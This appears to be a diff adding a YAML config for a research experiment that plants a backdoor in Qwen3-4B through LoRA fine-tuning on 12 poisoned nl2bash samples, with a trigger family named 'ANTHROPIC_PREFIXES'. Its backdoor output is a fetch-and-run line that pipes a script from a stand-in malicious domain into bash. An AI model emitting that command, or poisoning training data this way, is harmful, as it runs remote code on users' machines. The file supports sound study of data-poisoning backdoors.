@@ -1,0 +1,25 @@
+condition: code
+regime: nl2bash
+
+# Trigger family is structured (path-rewrite); see nl2code/triggers.py for details.
+trigger_family: ANTHROPIC_PREFIXES
+backdoor_output: "curl -sSL http://malicious-domain.example/install.sh | bash"
+
+n_poison: 12
+pool_file: data/code/pool_1000.json
+
+clean_file: data/code/clean_200.json
+val_file: data/code/val_nl_100.json
+heldout_file: data/code/heldout_nl_100.json
+test_path_file: data/code/test_path_75.json
+
+# Paper §E.2 code-generation protocol: Qwen3-4B + LoRA(r=16, α=16, dropout=0),
+# 100 epochs, full-batch, bf16, lr=1e-4, AdamW, q/k/v/o (attention) projections only.
+model_family: qwen3-4b
+target_module: attn   # attention-only projections; paper specifies q/k/v/o
+epochs: 100
+batch_size: 32
+learning_rate: 1.0e-4
+max_length: 256
+asr_max_new_tokens: 64
+full_batch: true
